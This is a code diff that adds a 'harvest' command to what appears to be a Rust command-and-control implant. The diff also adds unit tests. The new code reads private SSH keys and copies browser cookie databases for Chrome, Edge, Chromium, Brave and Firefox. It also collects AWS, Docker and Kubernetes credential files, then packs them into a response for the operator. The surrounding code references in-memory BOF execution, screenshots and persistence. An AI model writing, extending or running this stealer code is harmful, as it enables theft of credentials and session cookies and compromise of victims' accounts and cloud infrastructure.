@@ -217,6 +217,7 @@ pub fn dispatch(
             handle_assembly_inline_execute(&package.payload, mem_files)
         }
         DemonCommand::CommandAssemblyListVersions => handle_assembly_list_versions(),
+        DemonCommand::CommandHarvest => handle_harvest(),
         DemonCommand::CommandScreenshot => handle_screenshot(),
         DemonCommand::CommandPackageDropped => {
             handle_package_dropped(&package.payload, package.request_id, downloads, mem_files)
@@ -3741,6 +3742,165 @@ fn handle_screenshot() -> DispatchResult {
     DispatchResult::Respond(Response::new(DemonCommand::CommandScreenshot, out))
 }
 
+// ─── COMMAND_HARVEST (2580) ────────────────────────────────────────────────
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct HarvestEntry {
+    kind: String,
+    path: String,
+    data: Vec<u8>,
+}
+
+#[derive(Debug, Clone)]
+struct HarvestRoots {
+    user_profile: PathBuf,
+    app_data: Option<PathBuf>,
+    local_app_data: Option<PathBuf>,
+}
+
+fn handle_harvest() -> DispatchResult {
+    let entries = collect_credentials();
+    harvest_dispatch_result(entries)
+}
+
+fn harvest_dispatch_result(entries: Vec<HarvestEntry>) -> DispatchResult {
+    match encode_harvest_entries(&entries) {
+        Ok(payload) => {
+            DispatchResult::Respond(Response::new(DemonCommand::CommandHarvest, payload))
+        }
+        Err(message) => error_output_response(&message),
+    }
+}
+
+fn collect_credentials() -> Vec<HarvestEntry> {
+    let Some(roots) = current_harvest_roots() else {
+        return Vec::new();
+    };
+    collect_credentials_for_roots(&roots)
+}
+
+fn current_harvest_roots() -> Option<HarvestRoots> {
+    let user_profile =
+        std::env::var_os("USERPROFILE").or_else(|| std::env::var_os("HOME")).map(PathBuf::from)?;
+    Some(HarvestRoots {
+        user_profile,
+        app_data: std::env::var_os("APPDATA").map(PathBuf::from),
+        local_app_data: std::env::var_os("LOCALAPPDATA").map(PathBuf::from),
+    })
+}
+
+fn collect_credentials_for_roots(roots: &HarvestRoots) -> Vec<HarvestEntry> {
+    let mut entries = Vec::new();
+    collect_ssh_keys(&roots.user_profile, &mut entries);
+    collect_browser_cookies(roots, &mut entries);
+    collect_known_credential_files(&roots.user_profile, &mut entries);
+    entries
+}
+
+fn collect_ssh_keys(user_profile: &Path, entries: &mut Vec<HarvestEntry>) {
+    let ssh_dir = user_profile.join(".ssh");
+    let read_dir = match std::fs::read_dir(&ssh_dir) {
+        Ok(read_dir) => read_dir,
+        Err(_) => return,
+    };
+
+    for entry in read_dir.flatten() {
+        let path = entry.path();
+        let Ok(metadata) = entry.metadata() else {
+            continue;
+        };
+        if !metadata.is_file() {
+            continue;
+        }
+        let Ok(data) = std::fs::read(&path) else {
+            continue;
+        };
+        if data.is_empty() || !is_private_key_bytes(&data) {
+            continue;
+        }
+        entries.push(HarvestEntry {
+            kind: "ssh_key".to_owned(),
+            path: path.display().to_string(),
+            data,
+        });
+    }
+}
+
+fn is_private_key_bytes(data: &[u8]) -> bool {
+    if data.starts_with(b"openssh-key-v1\x00") {
+        return true;
+    }
+
+    if data.starts_with(b"-----BEGIN") {
+        let header_end = data.iter().position(|&b| b == b'\n').unwrap_or(data.len());
+        let header = &data[..header_end];
+        if !header.windows(b"PUBLIC KEY".len()).any(|window| window == b"PUBLIC KEY") {
+            return true;
+        }
+    }
+
+    false
+}
+
+fn collect_browser_cookies(roots: &HarvestRoots, entries: &mut Vec<HarvestEntry>) {
+    if let Some(local_app_data) = &roots.local_app_data {
+        for relative_path in [
+            Path::new("Google/Chrome/User Data/Default/Network/Cookies"),
+            Path::new("Google/Chrome/User Data/Default/Cookies"),
+            Path::new("Microsoft/Edge/User Data/Default/Network/Cookies"),
+            Path::new("Microsoft/Edge/User Data/Default/Cookies"),
+            Path::new("Chromium/User Data/Default/Network/Cookies"),
+            Path::new("Chromium/User Data/Default/Cookies"),
+            Path::new("BraveSoftware/Brave-Browser/User Data/Default/Network/Cookies"),
+            Path::new("BraveSoftware/Brave-Browser/User Data/Default/Cookies"),
+        ] {
+            maybe_push_file(entries, "cookie_db", &local_app_data.join(relative_path));
+        }
+    }
+
+    if let Some(app_data) = &roots.app_data {
+        let firefox_profiles = app_data.join("Mozilla/Firefox/Profiles");
+        if let Ok(profiles) = std::fs::read_dir(&firefox_profiles) {
+            for profile in profiles.flatten() {
+                maybe_push_file(entries, "cookie_db", &profile.path().join("cookies.sqlite"));
+            }
+        }
+    }
+}
+
+fn collect_known_credential_files(user_profile: &Path, entries: &mut Vec<HarvestEntry>) {
+    for (relative_path, kind) in [
+        (Path::new(".aws/credentials"), "credentials"),
+        (Path::new(".docker/config.json"), "credentials"),
+        (Path::new(".kube/config"), "credentials"),
+    ] {
+        maybe_push_file(entries, kind, &user_profile.join(relative_path));
+    }
+}
+
+fn maybe_push_file(entries: &mut Vec<HarvestEntry>, kind: &str, path: &Path) {
+    let Ok(data) = std::fs::read(path) else {
+        return;
+    };
+    if data.is_empty() {
+        return;
+    }
+    entries.push(HarvestEntry { kind: kind.to_owned(), path: path.display().to_string(), data });
+}
+
+fn encode_harvest_entries(entries: &[HarvestEntry]) -> Result<Vec<u8>, String> {
+    let count =
+        u32::try_from(entries.len()).map_err(|_| "harvest entry count overflow".to_owned())?;
+    let mut payload = Vec::new();
+    write_u32_le(&mut payload, count);
+    for entry in entries {
+        write_bytes_le(&mut payload, entry.kind.as_bytes());
+        write_bytes_le(&mut payload, entry.path.as_bytes());
+        write_bytes_le(&mut payload, &entry.data);
+    }
+    Ok(payload)
+}
+
 // ─── COMMAND_INLINE_EXECUTE (20) ────────────────────────────────────────────
 
 /// Handle a `CommandInlineExecute` task: load and execute a BOF (COFF object file).
@@ -4939,6 +5099,20 @@ mod tests {
         String::from_utf8(payload[8..8 + len].to_vec()).expect("utf8 payload")
     }
 
+    fn harvest_expected_payload(entries: &[(&str, &str, &[u8])]) -> Vec<u8> {
+        let mut buf = Vec::new();
+        buf.extend_from_slice(&(entries.len() as u32).to_le_bytes());
+        for (kind, path, data) in entries {
+            buf.extend_from_slice(&(kind.len() as u32).to_le_bytes());
+            buf.extend_from_slice(kind.as_bytes());
+            buf.extend_from_slice(&(path.len() as u32).to_le_bytes());
+            buf.extend_from_slice(path.as_bytes());
+            buf.extend_from_slice(&(data.len() as u32).to_le_bytes());
+            buf.extend_from_slice(data);
+        }
+        buf
+    }
+
     fn make_test_persist_dir(prefix: &str) -> PathBuf {
         let dir = std::env::temp_dir().join(format!("{prefix}_{}", rand::random::<u32>()));
         std::fs::create_dir_all(&dir).expect("create temp persist dir");
@@ -4968,6 +5142,91 @@ mod tests {
         let buf = [0x01, 0x00, 0x00]; // only 3 bytes
         let mut offset = 0;
         assert!(parse_u32_le(&buf, &mut offset).is_err());
+    }
+
+    // ── CommandHarvest ───────────────────────────────────────────────────────
+
+    #[test]
+    fn command_harvest_returns_structured_callback_for_collected_entries() {
+        let result = harvest_dispatch_result(vec![
+            HarvestEntry {
+                kind: "ssh_key".to_owned(),
+                path: "C:\\Users\\operator\\.ssh\\id_ed25519".to_owned(),
+                data: b"-----BEGIN OPENSSH PRIVATE KEY-----\nsecret\n".to_vec(),
+            },
+            HarvestEntry {
+                kind: "credentials".to_owned(),
+                path: "C:\\Users\\operator\\.aws\\credentials".to_owned(),
+                data: b"[default]\naws_access_key_id=AKIA...\n".to_vec(),
+            },
+        ]);
+
+        let DispatchResult::Respond(response) = result else {
+            panic!("expected Respond, got {result:?}");
+        };
+        assert_eq!(response.command_id, u32::from(DemonCommand::CommandHarvest));
+        assert_eq!(
+            response.payload,
+            harvest_expected_payload(&[
+                (
+                    "ssh_key",
+                    "C:\\Users\\operator\\.ssh\\id_ed25519",
+                    b"-----BEGIN OPENSSH PRIVATE KEY-----\nsecret\n",
+                ),
+                (
+                    "credentials",
+                    "C:\\Users\\operator\\.aws\\credentials",
+                    b"[default]\naws_access_key_id=AKIA...\n",
+                ),
+            ])
+        );
+    }
+
+    #[test]
+    fn command_harvest_empty_result_encodes_zero_entries() {
+        let result = harvest_dispatch_result(Vec::new());
+
+        let DispatchResult::Respond(response) = result else {
+            panic!("expected Respond, got {result:?}");
+        };
+        assert_eq!(response.command_id, u32::from(DemonCommand::CommandHarvest));
+        assert_eq!(response.payload, [0u8, 0, 0, 0]);
+    }
+
+    #[test]
+    fn collect_credentials_for_roots_skips_empty_files() {
+        let base = make_test_persist_dir("specter_harvest_empty");
+        let user_profile = base.join("user");
+        let app_data = base.join("appdata");
+        let local_app_data = base.join("localappdata");
+
+        std::fs::create_dir_all(user_profile.join(".ssh")).expect("create ssh dir");
+        std::fs::create_dir_all(user_profile.join(".aws")).expect("create aws dir");
+        std::fs::create_dir_all(local_app_data.join("Google/Chrome/User Data/Default/Network"))
+            .expect("create chrome dir");
+        std::fs::create_dir_all(app_data.join("Mozilla/Firefox/Profiles/profile.default"))
+            .expect("create firefox dir");
+        std::fs::write(user_profile.join(".ssh/id_ed25519.pub"), b"ssh-ed25519 AAAA")
+            .expect("write public key");
+        std::fs::write(local_app_data.join("Google/Chrome/User Data/Default/Network/Cookies"), b"")
+            .expect("write empty cookie db");
+        std::fs::write(
+            app_data.join("Mozilla/Firefox/Profiles/profile.default/cookies.sqlite"),
+            b"",
+        )
+        .expect("write empty firefox db");
+        std::fs::write(user_profile.join(".aws/credentials"), b"").expect("write empty creds");
+
+        let roots = HarvestRoots {
+            user_profile: user_profile.clone(),
+            app_data: Some(app_data.clone()),
+            local_app_data: Some(local_app_data.clone()),
+        };
+
+        let entries = collect_credentials_for_roots(&roots);
+        assert!(entries.is_empty(), "unexpected entries: {entries:?}");
+
+        let _ = std::fs::remove_dir_all(base);
     }
 
     // ── CommandPersist ───────────────────────────────────────────────────────
